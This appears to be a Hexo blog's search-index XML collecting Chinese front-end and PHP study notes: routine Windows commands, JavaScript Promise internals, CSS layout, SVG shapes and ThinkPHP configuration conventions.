<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[架构思考]]></title>
    <url>%2F2019%2F01%2F21%2Ffirst%2F</url>
    <content type="text"><![CDATA[UI与数据的联动 1.数据的引用 2.持有数据层的Builder,生成各个复杂控件的DataAdapter,当数据改变时,数据层同时DataAdapter,DataAdapter通知UI层 前端路由问题 1.注册路由 2.修改路由 3.前进后退路由 对象之间关系,类之间关系]]></content>
      <categories>
        <category>工作</category>
      </categories>
      <tags>
        <tag>工作总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开发规范总结]]></title>
    <url>%2F2019%2F01%2F19%2Fsecond%2F</url>
    <content type="text"><![CDATA[开发初衷性能 -&gt; 易用性 -&gt; 扩展性 -&gt; 实现简便 开发路线需求分析 -&gt; 设计 -&gt; 评审 -&gt; 开发 -&gt; 测试 -&gt; 上线 规范点 1.变量名命名 2.方法名命名(set,get,is,not放到前面,内部私有方法放后面) 3.成员属性与局部属性命名保持一致 4.使用单例需全面考虑情况 5.开发功能与测试用例同步 6.了解一个产品的架构模式,写代码时需要按照这种结构来 7.看内部是否已经实现过同样的功能,如果有则拿来用或者扩展,不重复造轮子 8.]]></content>
      <categories>
        <category>工作</category>
      </categories>
      <tags>
        <tag>工作总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[实用工具汇总]]></title>
    <url>%2F2019%2F01%2F19%2Ffirst%2F</url>
    <content type="text"><![CDATA[svg转fontsvg转font链接地址 svg制作svg在线制作地址 在线画图工具在线画图链接地址 在线图片压缩工具压缩图片地址 在线颜色值转化工具颜色RGB转HSV HTML JS CSS API查询工具MDN WEB DOCS 关于浏览器的尺寸参数height,clientHeight,scrollHeight,offsetHeight的区别]]></content>
      <categories>
        <category>工作</category>
      </categories>
      <tags>
        <tag>工作总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows常用命令]]></title>
    <url>%2F2019%2F01%2F18%2Fsecond%2F</url>
    <content type="text"><![CDATA[打开cmd窗口 返回上一级1$ cd .. 显示当前目录1$ dir 显示目录树1$ tree 创建文件夹1$ mkdir 文件名 查看端口1$ netstat -ano | findstr "8080" 结束进程1$ taskkill -f -PID 进程号 强制让文件变成非隐藏文件1$ attrib d:\a\*.* -s -h /s /d 恢复网络1$ netsh winsock reset catalog 刷新DNS解析缓存1$ ipconfig /flushdns 加载dll文件1$ regsvr32 dll 创建服务1$ sc create servicename binpath="命令" 删除服务1$ sc delete servicename 输出内容到文件或者创建文件12echo 文本&gt;c:\myjishi\wo.txt //添加文本到wo.txt(如果没有wo.txt会自动创建)echo 换行文本&gt;&gt;c:\myjishi\wo.txt //添加换行文本到wo.txt]]></content>
      <categories>
        <category>实用技术</category>
      </categories>
      <tags>
        <tag>实用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript基本知识点]]></title>
    <url>%2F2019%2F01%2F18%2Fthird%2F</url>
    <content type="text"><![CDATA[关于js的splice、sliceslice(startIndex, endIndex)不改变原数组,取[startIndex, endIndex)之间的数据,返回数组.splice(startIndex, delNum, …[])改变原数组,从startIndex开始删除,删除delNum个,并加入若干元素 1234let a = [1, 2, 3];console.log(a.slice(0, 2)); // [1, 2]console.log(a.splice(0, 1, 4)) // [1];console.log(a); // [4, 2, 3] 关于js的bindjs的bind方法,每次都会返回一个新的方法地址,所以在需要记录方法地址时,需要用变量记录。如监听事件， 1234567private funcHandle: Function;private func()&#123;&#125;window.addEventListener('keydown', this.func.bind(this));window.removeEventListener('keydown', this.func); // 这种做法是错误的window.addEventListener('keydown', this.funcHandle = this.func.bind(this));window.removeEventListener('keydown', this.funcHandle); // 正确做法 关于js的Promise使用了设计模式中的观察者模式极简promise雏形 12345678910111213141516function Promise(fn) &#123; var value = null; var callbacks = []; this.then = function(onFulfilled) &#123; callbacks.push(onFulfilled); &#125;; function resolve(value) &#123; callbacks.forEach(function(callback) &#123; callback(value); &#125;); &#125;; fn(resolve);&#125; 可以看的出来当使用者调用then方法时是往这个堆中的callbacks压入方法,Promise内部向外部丢了resolve方法,当外部执行resolve时会依次执行压入的方法,并将参数传递给方法。 这样会带来一个问题,当resolve执行后,注册过的函数都会执行,而后面再进行then的方法不会执行,这显然不是最好的。 于是加入了状态,pending,fulfilled,rejected. 改进后的代码 1234567891011121314151617181920212223function Promise(fn) &#123; var state = 'pending', value = null, callbacks = []; this.then = function (onFulfilled) &#123; if (state === 'pending') &#123; callbacks.push(onFulfilled); return this; &#125; onFulfilled(value); return this; &#125;; function resolve(newValue) &#123; value = newValue; state = 'fulfilled'; setTimeout(function () &#123; callbacks.forEach(function (callback) &#123; callback(value); &#125;); &#125;, 0); &#125; fn(resolve);&#125; 上述代码的思路是这样的：resolve执行时，会将状态设置为fulfilled，在此之后调用then添加的新回调，都会立即执行。 链式Promise如果用户再then函数里面注册的仍然是一个Promise. 123456789101112getUserId() .then(getUserJobById) .then(function (job) &#123; // 对job的处理 &#125;);function getUserJobById(id) &#123; return new Promise(function (resolve) &#123; http.get(baseUrl + id, function(job) &#123; resolve(job); &#125;); &#125;);&#125; 改造方法 12345678910111213141516171819202122232425262728293031323334353637383940414243function Promise(fn) &#123; var state = 'pending', value = null, callbacks = []; this.then = function (onFulfilled) &#123; return new Promise(function (resolve) &#123; handle(&#123; onFulfilled: onFulfilled || null, resolve: resolve &#125;); &#125;); &#125;; function handle(callback) &#123; if (state === 'pending') &#123; callbacks.push(callback); return; &#125; //如果then中没有传递任何东西 if(!callback.onFulfilled) &#123; callback.resolve(value); return; &#125; var ret = callback.onFulfilled(value); callback.resolve(ret); &#125; function resolve(newValue) &#123; if (newValue &amp;&amp; (typeof newValue === 'object' || typeof newValue === 'function')) &#123; var then = newValue.then; if (typeof then === 'function') &#123; then.call(newValue, resolve); return; &#125; &#125; state = 'fulfilled'; value = newValue; setTimeout(function () &#123; callbacks.forEach(function (callback) &#123; handle(callback); &#125;); &#125;, 0); &#125; fn(resolve);&#125; 关于浏览器的history一个页面中的历史记录长度: history.length向历史记录中push一个url: history.pushState() 不改变页面替换当前路由中的状态: history.replaceState() 不改变页面回退历史记录: history.back() 改变页面至当前的url前进历史记录: history.forward() 改变页面当前的url]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>工作总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端调试技巧]]></title>
    <url>%2F2019%2F01%2F18%2Ffirst%2F</url>
    <content type="text"><![CDATA[前端调试技巧准备工作 1.对整体数据结构和UI结构有大致的了解 2.根据关键字查找ts,js,properties等文件 3.根据界面的className,attribute属性值的关键字查找文件 4.根据国际化的key值查找代码所在位置 开始工作 1.断点调试（无条件断点，条件断点） 2.单步调试 3.步入调试 4.检测内存值 5.修改内存值 调试堆栈堆栈的信息很重要,他能让你解析整个内存过程。]]></content>
      <categories>
        <category>TypeScript</category>
      </categories>
      <tags>
        <tag>工作总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[刮刮乐]]></title>
    <url>%2F2019%2F01%2F18%2Ffour%2F</url>
    <content type="text"><![CDATA[浏览器滚动条滚动条高度总结公式: clientHeight(内容高度) / scrollHeight(滚动高度) = scrollBoxHeight(滚动条所在盒子高度) / scrollBarHeight(滚动条本身高度); 滚动条定位总结公式: scrollTop(滚动后离顶部的距离) / scrollHeight(滚动高度) = scrollBarTop(滚动条离顶部的距离) / scrollBoxHeight(滚动条盒子的高度);证明scrollTop / scrollHeight = scrollBarTop]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>工作总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端实习项目总结一]]></title>
    <url>%2F2017%2F08%2F05%2Ffirst%2F</url>
    <content type="text"><![CDATA[关于定位总结position:[static,absolute,relative,fixed]默认值:static适用于:除display属性定义为table-column-group|table-column之外的所有元素。static:对象遵循常规流。此时4个定位偏移属性不会被应用。relative:对象遵循常规流，并且参照自身在常规流中的位置通过top,right,bottom,left这四个定位偏移属性进行偏移时不会影响常规流中的任何元素。(这里要特别注意，它的意思是，用了relative定位，top,right,bottom,left只是让元素发生偏移而不是改变了常规流，此时这个元素能改变常规流的是它的margin,padding,border)absolute:对象脱离常规流，此时偏移属性参照的是离自身最近的定位祖先元素，如果没有定位的祖先元素，则一直回溯到body元素。盒子的偏移位置不影响常规流中的任何元素，其margin不与其他任何margin折叠。(这里要注意的是它的参照物，定位的祖先元素，也就是它的祖先元素一定可以用top,bottom,left,right来定位)fixed:与absolute一致，但偏移定位是以窗口为参考。当出现滚动条时，对象不会随着滚动。center(css3):与absolute一致，但偏移定位是以定位祖先元素的中心点为参考。page(css3):与absolute一致。元素在分页媒体或者区域块内，元素的包含块始终是初始包含块，否则取决于每个absolute模式。 关于布局总结display:none|inline|block|inline-block|table | inline-table | table-caption | table-cell | table-row | table-row-group | table-column | table-column-group | table-footer-group | table-header-group默认值:inline。none:隐藏对象。与visibility属性的hidden值不同，其不为被隐藏的对象保留其物理空间。inline:指定对象为内联元素。block:指定对象为块状元素。list-item:指定对象为列表项目。inline-block:指定对象为内联块元素。table:指定对象作为块元素级表格。inline-table:指定对象作为内联元素级的表格。类同于html标签。table-caption： 指定对象作为表格标题。类同于html标签（CSS2）table-cell： 指定对象作为表格单元格。类同于html标签（CSS2）table-row： 指定对象作为表格行。类同于html标签（CSS2）table-row-group： 指定对象作为表格行组。类同于html标签（CSS2）table-column： 指定对象作为表格列。类同于html标签（CSS2）table-column-group： 指定对象作为表格列组显示。类同于html标签（CSS2）table-header-group： 指定对象作为表格标题组。类同于html标签（CSS2）table-footer-group： 指定对象作为表格脚注组。类同于html标签（CSS2）float:none|left|right默认值:nonenone： 设置对象不浮动left： 设置对象浮在左边right： 设置对象浮在右边float在绝对定位和display为none时不生效。clear:none|left|right|both适用于:块级元素none： 允许两边都可以有浮动对象both： 不允许有浮动对象left： 不允许左边有浮动对象right： 不允许右边有浮动对象visible:visible|hidden|collapse默认值:visiblevisible： 设置对象可视hidden： 设置对象隐藏collapse： 主要用来隐藏表格的行或列。隐藏的行或列能够被其他内容使用。对于表格外的其他对象，其作用等同于hidden。overflowoverflow-xoverflow-y:visible|hidden|scroll|auto默认值:visiblevisible： 对溢出内容不做处理，内容可能会超出容器。hidden： 隐藏溢出容器的内容且不出现滚动条。scroll： 隐藏溢出容器的内容，溢出的内容将以卷动滚动条的方式呈现。auto： 当内容没有溢出容器时不出现滚动条，当内容溢出容器时出现滚动条，按需出现滚动条。此为body对象和textarea的默认值 遇到过得问题关于浮动的应用，当两个div想要在一个水平面时，一个设置左浮动，另一个设置右浮动，而下面的一个div需要清除浮动。则达到效果。]]></content>
      <categories>
        <category>html</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SVG用法]]></title>
    <url>%2F2017%2F07%2F27%2Ffirst%2F</url>
    <content type="text"><![CDATA[SVG简介SVG指可伸缩矢量图形SVG用来定义用于网络的基于矢量的图形SVG使用XML格式定义图形SVG图像在放大或改变尺寸的情况下其图形质量不会有所损失SVG是万维网联盟的标准SVG与诸如DOM与XSL之类的W3C标准的一个整体 SVG矩形123456789101112&lt;?xml version="1.0" standalone="no"?&gt;&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;&lt;svg width="100%" height="100%" version="1.1"xmlns="http://www.w3.org/2000/svg"&gt;&lt;rect width="300" height="100"style="fill:rgb(0,0,255);stroke-width:1;stroke:rgb(0,0,0)"/&gt;&lt;/svg&gt; rect 元素的 width 和 height 属性可定义矩形的高度和宽度style 属性用来定义 CSS 属性CSS 的 fill 属性定义矩形的填充颜色（rgb 值、颜色名或者十六进制值）CSS 的 stroke-width 属性定义矩形边框的宽度CSS 的 stroke 属性定义矩形边框的颜色 SVG圆形1234567891011&lt;?xml version="1.0" standalone="no"?&gt;&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;&lt;svg width="100%" height="100%" version="1.1"xmlns="http://www.w3.org/2000/svg"&gt;&lt;circle cx="100" cy="50" r="40" stroke="black"stroke-width="2" fill="red"/&gt;&lt;/svg&gt; cx 和 cy 属性定义圆点的 x 和 y 坐标。如果省略 cx 和 cy，圆的中心会被设置为 (0, 0)r 属性定义圆的半径。 SVG椭圆123456789101112&lt;?xml version="1.0" standalone="no"?&gt;&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;&lt;svg width="100%" height="100%" version="1.1"xmlns="http://www.w3.org/2000/svg"&gt;&lt;ellipse cx="300" cy="150" rx="200" ry="80"style="fill:rgb(200,100,50);stroke:rgb(0,0,100);stroke-width:2"/&gt;&lt;/svg&gt; cx 属性定义圆点的 x 坐标cy 属性定义圆点的 y 坐标rx 属性定义水平半径ry 属性定义垂直半径 SVG线条1234567891011&lt;?xml version="1.0" standalone="no"?&gt;&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;&lt;svg width="100%" height="100%" version="1.1"xmlns="http://www.w3.org/2000/svg"&gt;&lt;line x1="0" y1="0" x2="300" y2="300"style="stroke:rgb(99,99,99);stroke-width:2"/&gt;&lt;/svg&gt; x1 属性在 x 轴定义线条的开始y1 属性在 y 轴定义线条的开始x2 属性在 x 轴定义线条的结束y2 属性在 y 轴定义线条的结束 SVG多边形123456789101112&lt;?xml version="1.0" standalone="no"?&gt;&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;&lt;svg width="100%" height="100%" version="1.1"xmlns="http://www.w3.org/2000/svg"&gt;&lt;polygon points="220,100 300,210 170,250"style="fill:#cccccc;stroke:#000000;stroke-width:1"/&gt;&lt;/svg&gt; points 属性定义多边形每个角的 x 和 y 坐标 SVG折线1234567891011&lt;?xml version="1.0" standalone="no"?&gt;&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;&lt;svg width="100%" height="100%" version="1.1"xmlns="http://www.w3.org/2000/svg"&gt;&lt;polyline points="0,0 0,20 20,20 20,40 40,40 40,60"style="fill:white;stroke:red;stroke-width:2"/&gt;&lt;/svg&gt; SVG路径下面的命令可用于路径数据：M = movetoL = linetoH = horizontal linetoV = vertical linetoC = curvetoS = smooth curvetoQ = quadratic Belzier curveT = smooth quadratic Belzier curvetoA = elliptical ArcZ = closepath以上所有命令均允许小写字母。大写表示绝对定位，小写表示相对定位。12345678910&lt;?xml version="1.0" standalone="no"?&gt;&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;&lt;svg width="100%" height="100%" version="1.1"xmlns="http://www.w3.org/2000/svg"&gt;&lt;path d="M250 150 L150 350 L350 350 Z" /&gt;&lt;/svg&gt; 上面的例子定义了一条路径，它开始于位置 250 150，到达位置 150 350，然后从那里开始到 350 350，最后在 250 150 关闭路径。 SVG线性渐变 可用来定义 SVG 的线性渐变。 标签必须嵌套在 的内部。 标签是 definitions 的缩写，它可对诸如渐变之类的特殊元素进行定义。线性渐变可被定义为水平、垂直或角形的渐变：当 y1 和 y2 相等，而 x1 和 x2 不同时，可创建水平渐变当 x1 和 x2 相等，而 y1 和 y2 不同时，可创建垂直渐变当 x1 和 x2 不同，且 y1 和 y2 不同时，可创建角形渐变请把下面的代码拷贝到记事本，然后把文件保存为 “linear1.svg”。把此文件放入您的 web 目录：1234567891011121314151617181920&lt;?xml version="1.0" standalone="no"?&gt;&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;&lt;svg width="100%" height="100%" version="1.1"xmlns="http://www.w3.org/2000/svg"&gt;&lt;defs&gt;&lt;linearGradient id="orange_red" x1="0%" y1="0%" x2="100%" y2="0%"&gt;&lt;stop offset="0%" style="stop-color:rgb(255,255,0);stop-opacity:1"/&gt;&lt;stop offset="100%" style="stop-color:rgb(255,0,0);stop-opacity:1"/&gt;&lt;/linearGradient&gt;&lt;/defs&gt;&lt;ellipse cx="200" cy="190" rx="85" ry="55"style="fill:url(#orange_red)"/&gt;&lt;/svg&gt; 标签的 id 属性可为渐变定义一个唯一的名称fill:url(#orange_red) 属性把 ellipse 元素链接到此渐变 标签的 x1、x2、y1、y2 属性可定义渐变的开始和结束位置渐变的颜色范围可由两种或多种颜色组成。每种颜色通过一个 标签来规定。offset 属性用来定义渐变的开始和结束位置。 SVG放射性渐变 用来定义放射性渐变。 标签必须嵌套在 中。 标签是 definitions 的缩写，它允许对诸如渐变等特殊元素进行定义。请把下面的代码拷贝到记事本，然后把文件保存为 “radial1.svg”。把此文件放入您的 web 目录：123456789101112131415161718192021&lt;?xml version="1.0" standalone="no"?&gt;&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;&lt;svg width="100%" height="100%" version="1.1"xmlns="http://www.w3.org/2000/svg"&gt;&lt;defs&gt;&lt;radialGradient id="grey_blue" cx="50%" cy="50%" r="50%"fx="50%" fy="50%"&gt;&lt;stop offset="0%" style="stop-color:rgb(200,200,200);stop-opacity:0"/&gt;&lt;stop offset="100%" style="stop-color:rgb(0,0,255);stop-opacity:1"/&gt;&lt;/radialGradient&gt;&lt;/defs&gt;&lt;ellipse cx="230" cy="200" rx="110" ry="100"style="fill:url(#grey_blue)"/&gt;&lt;/svg&gt; 标签的 id 属性可为渐变定义一个唯一的名称，fill:url(#grey_blue) 属性把 ellipse 元素链接到此渐变，cx、cy 和 r 属性定义外圈，而 fx 和 fy 定义内圈 渐变的颜色范围可由两种或多种颜色组成。每种颜色通过一个 标签来规定。offset 属性用来定义渐变的开始和结束位置。]]></content>
      <categories>
        <category>html</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ThinkPHP开发规范]]></title>
    <url>%2F2017%2F07%2F26%2Ffirst%2F</url>
    <content type="text"><![CDATA[命名规范类文件都是以.class.php为后缀（这里是指的ThinkPHP内部使用的类库文件，不代表外部加载的类库文件），使用驼峰法命名，并且首字母大写，例如 DbMysql.class.php；类的命名空间地址和所在的路径地址一致，例如 Home\Controller\UserController类所在的路径应该是 Application/Home/Controller/UserController.class.php；确保文件的命名和调用大小写一致，是由于在类Unix系统上面，对大小写是敏感的（而ThinkPHP在调试模式下面，即使在Windows平台也会严格检查大小写）；类名和文件名一致（包括上面说的大小写一致），例如 UserController类的文件命名是UserController.class.php， InfoModel类的文件名是InfoModel.class.php， 并且不同的类库的类命名有一定的规范；函数、配置文件等其他类库文件之外的一般是以.php为后缀（第三方引入的不做要求）；函数的命名使用小写字母和下划线的方式，例如 get_client_ip；方法的命名使用驼峰法，并且首字母小写或者使用下划线“_”，例如 getUserName，parseType，通常下划线开头的方法属于私有方法；属性的命名使用驼峰法，并且首字母小写或者使用下划线“”，例如 tableName、_instance，通常下划线开头的属性属于私有属性；以双下划线“”打头的函数或方法作为魔法方法，例如 call 和 __autoload；常量以大写字母和下划线命名，例如 HAS_ONE和 MANY_TO_MANY；配置参数以大写字母和下划线命名，例如HTML_CACHE_ON；语言变量以大写字母和下划线命名，例如MY_LANG，以下划线打头的语言变量通常用于系统语言变量，例如 _CLASS_NOT_EXIST_；对变量的命名没有强制的规范，可以根据团队规范来进行；ThinkPHP的模板文件默认是以.html 为后缀（可以通过配置修改）；数据表和字段采用小写加下划线方式命名，并注意字段名不要以下划线开头，例如 think_user 表和 user_name字段是正确写法，类似 _username 这样的数据表字段可能会被过滤。 配置ThinkPHP框架中所有配置文件的定义格式均采用返回PHP数组的方式，格式为：12345678//项目配置文件return array( 'DEFAULT_MODULE' =&gt; 'Index', //默认模块 'URL_MODEL' =&gt; '2', //URL模式 'SESSION_AUTO_START' =&gt; true, //是否开启session //更多配置参数 //...); 配置参数不区分大小写（因为无论大小写定义都会转换成小写），所以下面的配置等效：12345678//项目配置文件return array( 'default_module' =&gt; 'Index', //默认模块 'url_model' =&gt; '2', //URL模式 'session_auto_start' =&gt; true, //是否开启session //更多配置参数 //...); 123456789101112//项目配置文件return array( 'DEFAULT_MODULE' =&gt; 'Index', //默认模块 'URL_MODEL' =&gt; '2', //URL模式 'SESSION_AUTO_START' =&gt; true, //是否开启session 'USER_CONFIG' =&gt; array( 'USER_AUTH' =&gt; true, 'USER_TYPE' =&gt; 2, ), //更多配置参数 //...); 我们可以在应用入口文件中定义应用的配置文件的后缀，例如：1define('CONF_EXT','.ini'); 配置文件加载顺序惯例配置-&gt;应用配置-&gt;模式配置-&gt;调试配置-&gt;状态配置-&gt;模块配置-&gt;扩展配置-&gt;动态配置惯例配置;惯例重于配置是系统遵循的一个重要思想，框架内置有一个惯例配置文件（位于ThinkPHP/Conf/convention.php），按照大多数的使用对常用参数进行了默认配置。所以，对于应用的配置文件，往往只需要配置和惯例配置不同的或者新增的配置参数，如果你完全采用默认配置，甚至可以不需要定义任何配置文件。应用配置:应用配置文件也就是调用所有模块之前都会首先加载的公共配置文件（默认位于Application/Common/Conf/config.php）。模式配置:如果使用了普通应用模式之外的应用模式的话，还可以为应用模式（后面会有描述）单独定义配置文件，文件命名规范是： Application/Common/Conf/config_应用模式名称.php（仅在运行该模式下面才会加载）。调试配置:如果开启调试模式的话，则会自动加载框架的调试配置文件（位于ThinkPHP/Conf/debug.php）和应用调试配置文件（位于Application/Common/Conf/debug.php）状态配置:每个应用都可以在不同的情况下设置自己的状态（或者称之为应用场景），并且加载不同的配置文件。举个例子，你需要在公司和家里分别设置不同的数据库测试环境。那么可以这样处理，在公司环境中，我们在入口文件中定义：1define('APP_STATUS','office'); 那么就会自动加载该状态对应的配置文件（位于Application/Common/Conf/office.php）。如果我们回家后，我们修改定义为：1define('APP_STATUS','home'); 那么就会自动加载该状态对应的配置文件（位于Application/Common/Conf/home.php）。模块配置:每个模块会自动加载自己的配置文件（位于Application/当前模块名/Conf/config.php）。如果使用了普通模式之外的其他应用模式，你还可以为应用模式单独定义配置文件，命名规范为： Application/当前模块名/Conf/config_应用模式名称.php（仅在运行该模式下面才会加载）。 读取配置1$model = C('URL_MODEL'); 如果url_model尚未存在设置，则返回NULL。因为配置参数是全局有效的，因此C方法可以在任何地方读取任何配置，即使某个设置参数已经生效过期了。 动态配置C(‘参数名称’,’新的参数值’);动态配置赋值仅对当前请求有效，不会对以后的请求造成影响。动态改变配置参数的方法和读取配置的方法在使用上面非常接近，都是使用C方法，只是参数的不同。 也可以支持二维数组的读取和设置，使用点语法进行操作，如下：1234// 获取已经设置的参数值C('USER_CONFIG.USER_TYPE');//设置新的值C('USER_CONFIG.USER_TYPE',1); 扩展配置扩展配置可以支持自动加载额外的自定义配置文件，并且配置格式和项目配置一样。 设置扩展配置的方式如下（多个文件用逗号分隔）：12// 加载扩展配置文件'LOAD_EXT_CONFIG' =&gt; 'user,db', 假设扩展配置文件user.php 和db.php分别用于用户配置和数据库配置，这样做的好处是哪怕以后关闭调试模式，你修改db配置文件后依然会自动生效。如果在应用公共设置文件中配置的话，那么会自动加载应用公共配置目录下面的配置文件Application/Common/Conf/user.php和Application/Common/Conf/db.php。如果在模块（假设是Home模块）的配置文件中配置的话，则会自动加载模块目录下面的配置文件 Application/Home/Conf/user.php 和 Application/Home/Conf/db.php。默认情况下，扩展配置文件中的设置参数会并入项目配置文件中。也就是默认都是一级配置参数，例如user.php中的配置参数如下：1234567&lt;?php//用户配置文件return array( 'USER_TYPE' =&gt; 2, //用户类型 'USER_AUTH_ID' =&gt; 10, //用户认证ID 'USER_AUTH_TYPE' =&gt; 2, //用户认证模式); 那么，最终获取用户参数的方式是：1C('USER_AUTH_ID'); 如果配置文件改成：12// 加载扩展配置文件'LOAD_EXT_CONFIG' =&gt; array('USER'=&gt;'user','DB'=&gt;'db'), 则最终获取用户参数的方式改成：1C('USER.USER_AUTH_ID'); 批量配置C配置方法支持批量配置，例如：12$config = array('WEB_SITE_TITLE'=&gt;'ThinkPHP','WEB_SITE_DESCRIPTION'=&gt;'开源PHP框架');C($config); $config数组中的配置参数会合并到现有的全局配置中。我们可以通过这种方式读取数据库中的配置参数，例如：12345// 读取数据库中的配置（假设有一个config表用于保存配置参数）$config = M('Config')-&gt;getField('name,value');// config是一个关联数组 键值就是配置参数 值就是配置值// 例如： array('config1'=&gt;'val1','config2'=&gt;'val2',...)C($config); // 合并配置参数到全局配置 合并之后，我们就可以和前面读取普通配置参数一样，读取数据库中的配置参数了，当然也可以动态改变。1234// 读取合并到全局配置中的数据库中的配置参数C('CONFIG1');// 动态改变配置参数（当前请求有效，不会自动保存到数据库）C('CONFIG2','VALUE_NEW'); 架构模块化设计一个完整的ThinkPHP应用基于模块/控制器/操作设计，并且，如果有需要的话，可以支持多入口文件和多级控制器。一个典型的URL访问规则是:1http://serverName/index.php（或者其他应用入口文件）/模块/控制器/操作/[参数名/参数值...] 解释下其中的几个概念:|名称|描述||-|-||应用|基于同一个入口文件访问的项目我们称之为一个应用。||模块|一个应用下面可以包含多个模块，每个模块在应用目录下面都是一个独立的子目录。||控制器|每个模块可以包含多个控制器，一个控制器通常体现为一个控制器类。||操作|每个控制器类可以包含多个操作方法，也可能是绑定的某个操作类，每个操作是URL访问的最小单元。|模块化设计的思想下面模块是最重要的部分，模块其实是一个包含配置文件、函数文件和MVC文件（目录）的集合。新版采用模块化的设计架构，下面是一个应用目录下面的模块目录结构，每个模块可以方便的卸载和部署，并且支持公共模块。123456Application 默认应用目录（可以设置）├─Common 公共模块（不能直接访问）├─Home 前台模块├─Admin 后台模块├─... 其他更多模块├─Runtime 默认运行时目录（可以设置） 每个模块是相对独立的，其目录结构如下:123456789├─Module 模块目录│ ├─Conf 配置文件目录│ ├─Common 公共函数目录│ ├─Controller 控制器目录│ ├─Model 模型目录│ ├─Logic 逻辑目录（可选）│ ├─Service Service目录（可选）│ ... 更多分层目录可选│ └─View 视图目录 公共模块Common模块是一个特殊的模块，是应用的公共模块，访问所有的模块之前都会首先加载公共模块下面的配置文件（Conf/config.php）和公共函数文件（Common/function.php）。但Common模块本身不能通过URL直接访问，公共模块的其他文件则可以被其他模块继承或者调用。公共模块的位置可以通过COMMON_PATH常量改变，我们可以在入口文件中重新定义COMMON_PATH如下：123define('COMMON_PATH','./Common/');define('APP_PATH','./Application/');require './ThinkPHP/ThinkPHP.php'; 其应用目录结构变成：1234567www WEB部署目录（或者子目录）├─index.php 入口文件├─README.md README文件├─Common 应用公共模块目录├─Application 应用模块目录├─Public 应用资源文件目录└─ThinkPHP 框架目录 自动生成模块目录例如，如果我们需要生成一个Admin模块用于后台应用，在应用入口文件中定义如下：1234// 绑定Admin模块到当前入口文件define('BIND_MODULE','Admin');define('APP_PATH','./Application/');require './ThinkPHP/ThinkPHP.php'; 然后访问URL地址1http://serverName/index.php 就会生成Admin模块的目录，并生成一个默认的控制器类Admin\Controller\IndexController。 如果需要生成更多的控制器类，可以定义BUILD_CONTROLLER_LIST常量，例如：12345// 绑定Admin模块到当前入口文件define('BIND_MODULE','Admin');define('BUILD_CONTROLLER_LIST','Index,User,Menu');define('APP_PATH','./Application/');require './ThinkPHP/ThinkPHP.php'; 访问后会自动生成三个指定的控制器类：123Admin\Controller\IndexControllerAdmin\Controller\UserControllerAdmin\Controller\MenuController 禁止访问模块12// 设置禁止访问的模块列表'MODULE_DENY_LIST' =&gt; array('Common','Runtime','Api'), 设置后，Api模块不能通过URL直接访问，事实上，可能我们只是在该模块下面放置一些公共的接口文件，因此都是内部调用即可。如果你的应用下面模块比较少，还可以设置允许访问列表和默认模块，这样可以简化默认模块的URL访问。12'MODULE_ALLOW_LIST' =&gt; array('Home','Admin','User'),'DEFAULT_MODULE' =&gt; 'Home', 单模块设计如果你的应用够简单，那么也许仅仅用一个模块就可以完成，那么可以直接设置：123// 关闭多模块访问'MULTI_MODULE' =&gt; false,'DEFAULT_MODULE' =&gt; 'Home', 一旦关闭多模块访问后，就只能访问默认模块（这里设置的是Home）。 多入口设计可以给相同的应用及模块设置多个入口，不同的入口文件可以设置不同的应用模式或者绑定模块。1234// 绑定Home模块到当前入口文件define('BIND_MODULE','Home');define('APP_PATH','./Application/');require './ThinkPHP/ThinkPHP.php'; URL模式ThinkPHP框架的URL是区分大小写（主要是针对模块、控制器和操作名，不包括应用参数）的，这一点非常关键，因为ThinkPHP的命名规范是采用驼峰法（首字母大写）的规则，而URL中的模块和控制器都是对应的文件，因此在Linux环境下面必然存在区分大小写的问题。普通模式普通模式也就是传统的GET传参方式来指定当前访问的模块和操作，例如： http://localhost/?m=home&amp;c=user&amp;a=login&amp;var=valuem参数表示模块，c参数表示控制器，a参数表示操作（当然这些参数都是可以配置的），后面的表示其他GET参数。如果默认的变量设置和你的应用变量有冲突的话，你需要重新设置系统配置，例如改成下面的：123'VAR_MODULE' =&gt; 'module', // 默认模块获取变量'VAR_CONTROLLER' =&gt; 'controller', // 默认控制器获取变量'VAR_ACTION' =&gt; 'action', // 默认操作获取变量 上面的访问地址则变成： http://localhost/?module=home&amp;controller=user&amp;action=login&amp;var=value 